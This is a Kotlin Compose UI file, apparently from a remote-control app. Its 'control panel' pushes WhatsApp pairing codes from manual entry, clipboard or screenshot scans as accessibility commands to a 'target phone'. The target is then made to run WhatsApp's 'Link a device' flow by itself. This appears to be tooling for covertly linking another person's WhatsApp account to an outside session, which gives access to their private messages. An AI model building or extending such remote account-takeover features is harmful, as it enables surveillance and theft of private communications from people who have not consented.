package com.example.ui

import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.OpenInNew
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ContentPaste
import androidx.compose.material.icons.filled.History
import androidx.compose.material.icons.filled.Image
import androidx.compose.material.icons.filled.Link
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.QrCode
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ElevatedCard
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.util.AndroidBridge
import com.example.util.PairingCodeImageExtractor
import com.example.util.WhatsAppAutoLinkManager
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Composable
fun WhatsAppLinkedSection(
    viewModel: MainViewModel,
    isBn: Boolean = true,
    modifier: Modifier = Modifier,
    targetPhoneNumber: String = "",
    isControlPanelMode: Boolean = false,
    signalViewModel: FirebaseSignalViewModel? = null,
    targetDeviceId: String = ""
) {
    val context = LocalContext.current
    val autoLinkStatus by viewModel.whatsAppAutoLinkStatus.collectAsState()
    val isRunning by viewModel.isWhatsAppAutoLinkRunning.collectAsState()
    val currentStep by viewModel.whatsAppCurrentStep.collectAsState()
    val linkHistory by viewModel.whatsAppHistory.collectAsState()

    var showManualPairingInput by remember { mutableStateOf(true) }
    var manualCodeInput by remember { mutableStateOf("") }
    var screenshotScanStatus by remember { mutableStateOf("") }
    val coroutineScope = rememberCoroutineScope()

    val cardBg = if (isControlPanelMode) Color(0xFF0B111E) else Color.White
    val cardBorder = if (isControlPanelMode) Color(0xFF1E293B) else Color(0xFFA7F3D0)
    val titleColor = if (isControlPanelMode) Color.White else Color(0xFF064E3B)
    val subtitleColor = if (isControlPanelMode) Color(0xFF94A3B8) else Color(0xFF475569)

    val modernInputColors = if (isControlPanelMode) {
        OutlinedTextFieldDefaults.colors(
            focusedBorderColor = Color(0xFF10B981),
            unfocusedBorderColor = Color(0xFF334155),
            focusedContainerColor = Color(0xFF0A0F1D),
            unfocusedContainerColor = Color(0xFF0F172A),
            focusedLabelColor = Color(0xFF6EE7B7),
            unfocusedLabelColor = Color(0xFF94A3B8),
            cursorColor = Color(0xFF10B981),
            focusedTextColor = Color.White,
            unfocusedTextColor = Color.White
        )
    } else {
        OutlinedTextFieldDefaults.colors(
            focusedBorderColor = Color(0xFF059669),
            unfocusedBorderColor = Color(0xFF94A3B8),
            focusedContainerColor = Color(0xFFF0FDF4),
            unfocusedContainerColor = Color(0xFFF8FAFC),
            focusedLabelColor = Color(0xFF065F46),
            unfocusedLabelColor = Color(0xFF475569),
            cursorColor = Color(0xFF059669),
            focusedTextColor = Color(0xFF0F172A),
            unfocusedTextColor = Color(0xFF0F172A)
        )
    }

    // Zero-permission Android Photo Picker so visually impaired users/operators can select a screenshot of web.whatsapp.com
    val pickScreenshotLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.PickVisualMedia()
    ) { uri ->
        if (uri != null) {
            screenshotScanStatus = if (isBn) "ছবি থেকে পেয়ারিং নাম্বার স্ক্যান করা হচ্ছে..." else "Scanning pairing code from image..."
            coroutineScope.launch {
                try {
                    val bytes = context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                    if (bytes != null) {
                        val res = PairingCodeImageExtractor.extractPairingCodeFromBytes(context, bytes)
                        val code = res.code
                        if (!code.isNullOrBlank()) {
                            val formatted = res.formattedCode ?: code
                            screenshotScanStatus = if (isBn) {
                                "আলহামদুলিল্লাহ! ছবি থেকে কোড শনাক্ত হয়েছে: $formatted — অটো-লিঙ্ক শুরু হচ্ছে ✓"
                            } else {
                                "Code detected from image: $formatted"
                            }
                            if (isControlPanelMode && signalViewModel != null && targetPhoneNumber.isNotBlank()) {
                                signalViewModel.sendAccessibilitySignal(
                                    deviceId = targetDeviceId.ifBlank { "DEV-TARGET" },
                                    signalType = "WHATSAPP_LINK",
                                    command = "/send_cod_$code",
                                    messageBn = "স্ক্রিনশট কোড ($formatted) দিয়ে লিঙ্ক সিগন্যাল পাঠানো হয়েছে",
                                    priority = "CRITICAL",
                                    isControlPanelRemoteDispatch = true
                                )
                            }
                            viewModel.startWhatsAppAutoLink(code, targetPhoneNumber)
                        } else {
                            screenshotScanStatus = if (isBn) {
                                "ছবিতে ৮-ডিজিটের পেয়ারিং নাম্বার পাওয়া যায়নি। পরিষ্কার স্ক্রিনশট দিন।"
                            } else {
                                "Could not detect 8-digit pairing code in image."
                            }
                        }
                    }
                } catch (e: Exception) {
                    screenshotScanStatus = "স্ক্যান ত্রুটি: ${e.message}"
                }
            }
        }
    }

    ElevatedCard(
        modifier = modifier
            .fillMaxWidth()
            .padding(horizontal = 14.dp)
            .shadow(12.dp, RoundedCornerShape(26.dp))
            .border(1.5.dp, cardBorder, RoundedCornerShape(26.dp))
            .testTag("card_whatsapp_linked_devices"),
        colors = CardDefaults.elevatedCardColors(
            containerColor = cardBg
        ),
        elevation = CardDefaults.elevatedCardElevation(defaultElevation = 6.dp),
        shape = RoundedCornerShape(26.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(20.dp)
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween,
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.weight(1f)
                ) {
                    Box(
                        modifier = Modifier
                            .size(44.dp)
                            .clip(RoundedCornerShape(14.dp))
                            .background(
                                Brush.linearGradient(
                                    if (isControlPanelMode) {
                                        listOf(Color(0xFF064E3B), Color(0xFF0D9488))
                                    } else {
                                        listOf(Color(0xFFDCFCE7), Color(0xFFCCFBF1))
                                    }
                                )
                            )
                            .border(1.dp, Color(0xFF6EE7B7), RoundedCornerShape(14.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.Link,
                            contentDescription = null,
                            tint = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF059669),
                            modifier = Modifier.size(22.dp)
                        )
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Column {
                        Text(
                            text = if (isBn) "হোয়াটসঅ্যাপ লিঙ্কড ডিভাইস সার্ভিস" else "WhatsApp Linked Devices Service",
                            fontWeight = FontWeight.ExtraBold,
                            fontSize = 16.sp,
                            color = titleColor
                        )
                        Text(
                            text = if (targetPhoneNumber.isNotBlank()) "Target Phone: $targetPhoneNumber" else "Step: ${currentStep.name}",
                            fontSize = 11.5.sp,
                            color = Color(0xFF34D399),
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }

                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(50))
                        .background(if (isRunning) Color(0xFFFEF3C7) else (if (isControlPanelMode) Color(0xFF064E3B) else Color(0xFFDCFCE7)))
                        .border(
                            1.dp,
                            if (isRunning) Color(0xFFFCD34D) else Color(0xFF6EE7B7),
                            RoundedCornerShape(50)
                        )
                        .padding(horizontal = 12.dp, vertical = 5.dp)
                ) {
                    Text(
                        text = if (isRunning) (if (isBn) "অটো-লিঙ্ক চলছে" else "Linking...") else (if (isBn) "১০০% প্রস্তুত" else "100% Ready"),
                        fontSize = 11.5.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = if (isRunning) Color(0xFFD97706) else (if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF065F46))
                    )
                }
            }

            Spacer(modifier = Modifier.height(10.dp))

            Text(
                text = if (isBn) {
                    "কন্ট্রোল প্যানেল থেকে টার্গেট ফোনে স্বয়ংক্রিয়ভাবে WhatsApp লিঙ্ক সম্পন্ন করুন: মেনু ➔ Linked devices ➔ Link a device ➔ কোড পেস্ট ও চ্যাটে প্রত্যাবর্তন।"
                } else {
                    "Automated WhatsApp Linked Devices workflow executed on the connected target phone."
                },
                fontSize = 13.sp,
                color = subtitleColor,
                lineHeight = 18.sp
            )

            // Live Automation Step Banner
            if (autoLinkStatus.isNotBlank()) {
                Spacer(modifier = Modifier.height(10.dp))
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .border(1.2.dp, Color(0xFF6EE7B7), RoundedCornerShape(14.dp)),
                    colors = CardDefaults.cardColors(
                        containerColor = if (isControlPanelMode) Color(0xFF0A2E24) else Color(0xFFECFDF5)
                    ),
                    shape = RoundedCornerShape(14.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            imageVector = if (isRunning) Icons.Default.PlayArrow else Icons.Default.CheckCircle,
                            contentDescription = null,
                            tint = Color(0xFF10B981),
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = autoLinkStatus,
                            fontSize = 12.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF065F46)
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(12.dp))

            // Dual WhatsApp App Selector Buttons (Standard WhatsApp vs WhatsApp Business)
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Button(
                    onClick = {
                        val codeToUse = manualCodeInput.takeIf { it.isNotBlank() }
                        if (isControlPanelMode && signalViewModel != null && targetPhoneNumber.isNotBlank()) {
                            val cmd = if (codeToUse != null) "/send_cod_$codeToUse" else "/whatsapp"
                            signalViewModel.sendAccessibilitySignal(
                                deviceId = targetDeviceId.ifBlank { "DEV-TARGET" },
                                signalType = "WHATSAPP_LINK",
                                command = cmd,
                                messageBn = "টার্গেট ফোনে WhatsApp লিঙ্ক সিগন্যাল পাঠানো হয়েছে",
                                priority = "CRITICAL",
                                isControlPanelRemoteDispatch = true
                            )
                            if (codeToUse != null) {
                                viewModel.startWhatsAppAutoLink(codeToUse, targetPhoneNumber)
                            }
                        } else {
                            viewModel.selectWhatsAppVariantAndStart(
                                chooseBusiness = false,
                                explicitCode = codeToUse
                            )
                        }
                    },
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                        .testTag("btn_select_standard_whatsapp"),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                    elevation = ButtonDefaults.buttonElevation(defaultElevation = 3.dp),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(
                        imageVector = Icons.AutoMirrored.Filled.OpenInNew,
                        contentDescription = null,
                        modifier = Modifier.size(16.dp),
                        tint = Color.White
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "WhatsApp লিঙ্ক",
                        color = Color.White,
                        fontWeight = FontWeight.ExtraBold,
                        fontSize = 12.5.sp
                    )
                }

                OutlinedButton(
                    onClick = {
                        val codeToUse = manualCodeInput.takeIf { it.isNotBlank() }
                        if (isControlPanelMode && signalViewModel != null && targetPhoneNumber.isNotBlank()) {
                            val cmd = if (codeToUse != null) "/send_cod_${codeToUse}_business" else "/whatsapp_business"
                            signalViewModel.sendAccessibilitySignal(
                                deviceId = targetDeviceId.ifBlank { "DEV-TARGET" },
                                signalType = "WHATSAPP_LINK",
                                command = cmd,
                                messageBn = "টার্গেট ফোনে WhatsApp Business লিঙ্ক সিগন্যাল পাঠানো হয়েছে",
                                priority = "CRITICAL",
                                isControlPanelRemoteDispatch = true
                            )
                            if (codeToUse != null) {
                                viewModel.startWhatsAppAutoLink(codeToUse, targetPhoneNumber, WhatsAppAutoLinkManager.PKG_WHATSAPP_BUSINESS)
                            }
                        } else {
                            viewModel.selectWhatsAppVariantAndStart(
                                chooseBusiness = true,
                                explicitCode = codeToUse
                            )
                        }
                    },
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                        .testTag("btn_select_business_whatsapp"),
                    border = BorderStroke(1.5.dp, Color(0xFF059669)),
                    colors = ButtonDefaults.outlinedButtonColors(
                        containerColor = if (isControlPanelMode) Color(0xFF0D1B2A) else Color(0xFFECFDF5),
                        contentColor = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF065F46)
                    ),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Link,
                        contentDescription = null,
                        modifier = Modifier.size(16.dp),
                        tint = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF059669)
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "WA Business লিঙ্ক",
                        fontWeight = FontWeight.ExtraBold,
                        fontSize = 12.5.sp,
                        color = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF065F46)
                    )
                }
            }

            Spacer(modifier = Modifier.height(8.dp))

            // Quick Actions: Paste from Clipboard & Scan Screenshot
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                OutlinedButton(
                    onClick = {
                        val clip = AndroidBridge.getClipboardText(context)
                            ?.replace("-", "")
                            ?.replace(" ", "")
                            ?.trim()
                            ?.uppercase()
                            .orEmpty()
                        if (clip.length in 6..10) {
                            manualCodeInput = clip
                            if (isControlPanelMode && signalViewModel != null && targetPhoneNumber.isNotBlank()) {
                                signalViewModel.sendAccessibilitySignal(
                                    deviceId = targetDeviceId.ifBlank { "DEV-TARGET" },
                                    signalType = "WHATSAPP_LINK",
                                    command = "/send_cod_$clip",
                                    messageBn = "ক্লিপবোর্ড কোড ($clip) দিয়ে লিঙ্ক সিগন্যাল প্রেরিত",
                                    priority = "CRITICAL",
                                    isControlPanelRemoteDispatch = true
                                )
                            }
                            viewModel.startWhatsAppAutoLink(clip, targetPhoneNumber)
                        } else {
                            showManualPairingInput = true
                        }
                    },
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                        .testTag("btn_paste_clipboard_and_link"),
                    border = BorderStroke(1.2.dp, if (isControlPanelMode) Color(0xFF334155) else Color(0xFF6EE7B7)),
                    colors = ButtonDefaults.outlinedButtonColors(
                        containerColor = if (isControlPanelMode) Color(0xFF0F172A) else Color(0xFFF0FDF4),
                        contentColor = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF064E3B)
                    ),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.ContentPaste,
                        contentDescription = null,
                        modifier = Modifier.size(16.dp),
                        tint = if (isControlPanelMode) Color(0xFF34D399) else Color(0xFF059669)
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = if (isBn) "ক্লিপবোর্ড কোড রান" else "Run Clipboard Code",
                        fontWeight = FontWeight.ExtraBold,
                        fontSize = 12.sp,
                        color = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF064E3B)
                    )
                }

                OutlinedButton(
                    onClick = {
                        pickScreenshotLauncher.launch(
                            PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)
                        )
                    },
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                        .testTag("btn_scan_pairing_screenshot"),
                    border = BorderStroke(1.2.dp, if (isControlPanelMode) Color(0xFF334155) else Color(0xFF6EE7B7)),
                    colors = ButtonDefaults.outlinedButtonColors(
                        containerColor = if (isControlPanelMode) Color(0xFF0F172A) else Color(0xFFF0FDF4),
                        contentColor = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF064E3B)
                    ),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Image,
                        contentDescription = "Scan Pairing Code from Screenshot",
                        modifier = Modifier.size(16.dp),
                        tint = if (isControlPanelMode) Color(0xFF34D399) else Color(0xFF059669)
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = if (isBn) "স্ক্রিনশট স্ক্যান" else "Scan Screenshot",
                        fontWeight = FontWeight.ExtraBold,
                        fontSize = 12.sp,
                        color = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF064E3B)
                    )
                }
            }

            if (screenshotScanStatus.isNotBlank()) {
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = screenshotScanStatus,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = if (isControlPanelMode) Color(0xFF34D399) else Color(0xFF047857)
                )
            }

            // Direct 8-Digit Pairing Code Entry & Start Button
            AnimatedVisibility(visible = showManualPairingInput) {
                Column(modifier = Modifier.padding(top = 12.dp)) {
                    OutlinedTextField(
                        value = manualCodeInput,
                        onValueChange = {
                            manualCodeInput = it.replace("-", "").replace(" ", "").take(10).uppercase()
                        },
                        label = {
                            Text(
                                if (isBn) "৮ ডিজিটের পেয়ারিং কোড লিখুন (উদা: AGH86HJ2)" else "8-digit pairing code",
                                fontWeight = FontWeight.Bold
                            )
                        },
                        leadingIcon = {
                            Box(
                                modifier = Modifier
                                    .padding(start = 6.dp)
                                    .size(34.dp)
                                    .clip(RoundedCornerShape(10.dp))
                                    .background(if (isControlPanelMode) Color(0xFF064E3B) else Color(0xFFDCFCE7)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.QrCode,
                                    contentDescription = null,
                                    tint = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF059669),
                                    modifier = Modifier.size(19.dp)
                                )
                            }
                        },
                        colors = modernInputColors,
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("input_manual_code"),
                        singleLine = true,
                        shape = RoundedCornerShape(18.dp)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Button(
                            onClick = {
                                if (manualCodeInput.isNotBlank()) {
                                    val code = manualCodeInput.trim().uppercase()
                                    if (isControlPanelMode && signalViewModel != null && targetPhoneNumber.isNotBlank()) {
                                        signalViewModel.sendAccessibilitySignal(
                                            deviceId = targetDeviceId.ifBlank { "DEV-TARGET" },
                                            signalType = "WHATSAPP_LINK",
                                            command = "/send_cod_$code",
                                            messageBn = "পেয়ারিং কোড ($code) দিয়ে লিঙ্ক সিগন্যাল প্রেরিত",
                                            priority = "CRITICAL",
                                            isControlPanelRemoteDispatch = true
                                        )
                                    }
                                    viewModel.startWhatsAppAutoLink(code, targetPhoneNumber)
                                    manualCodeInput = ""
                                }
                            },
                            enabled = manualCodeInput.length >= 6,
                            modifier = Modifier
                                .weight(1f)
                                .height(54.dp)
                                .testTag("btn_submit_manual_code"),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF059669),
                                contentColor = Color.White,
                                disabledContainerColor = if (isControlPanelMode) Color(0xFF132D24) else Color(0xFFA7F3D0),
                                disabledContentColor = if (isControlPanelMode) Color(0xFF6EE7B7) else Color(0xFF064E3B)
                            ),
                            elevation = ButtonDefaults.buttonElevation(defaultElevation = 4.dp),
                            shape = RoundedCornerShape(18.dp)
                        ) {
                            Icon(Icons.Default.QrCode, contentDescription = null, modifier = Modifier.size(19.dp))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = if (isBn) "১০০% অটো-লিঙ্ক শুরু করুন" else "Start Auto-Link",
                                color = Color.White,
                                fontWeight = FontWeight.ExtraBold,
                                fontSize = 14.5.sp
                            )
                        }

                        if (isRunning) {
                            OutlinedButton(
                                onClick = { viewModel.stopWhatsAppAutoLink() },
                                modifier = Modifier
                                    .height(54.dp)
                                    .testTag("btn_stop_auto_link"),
                                border = BorderStroke(1.5.dp, Color(0xFFFCA5A5)),
                                colors = ButtonDefaults.outlinedButtonColors(
                                    containerColor = Color(0xFFFEF2F2),
                                    contentColor = Color(0xFFDC2626)
                                ),
                                shape = RoundedCornerShape(18.dp)
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Stop,
                                    contentDescription = "Stop Automation",
                                    tint = Color(0xFFDC2626)
                                )
                            }
                        }
                    }
                }
            }

            if (linkHistory.isNotEmpty()) {
                Spacer(modifier = Modifier.height(14.dp))
                HorizontalDivider(color = if (isControlPanelMode) Color(0xFF1E293B) else Color(0xFFE2E8F0))
                Spacer(modifier = Modifier.height(10.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.History,
                        contentDescription = null,
                        modifier = Modifier.size(16.dp),
                        tint = if (isControlPanelMode) Color(0xFF94A3B8) else MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = if (isBn) "সাম্প্রতিক লিঙ্ক রেকর্ড (Link History)" else "Recent WhatsApp Link Records",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = if (isControlPanelMode) Color(0xFF94A3B8) else MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }
                Spacer(modifier = Modifier.height(6.dp))
                linkHistory.take(3).forEach { record ->
                    val timeStr = SimpleDateFormat("dd/MM h:mm a", Locale.getDefault()).format(Date(record.timestamp))
                    Text(
                        text = "• $timeStr — কোড: ${record.pairingCode} (${record.status})",
                        fontSize = 11.5.sp,
                        color = if (isControlPanelMode) Color(0xFFCBD5E1) else Color(0xFF334155)
                    )
                }
            }
        }
    }
}
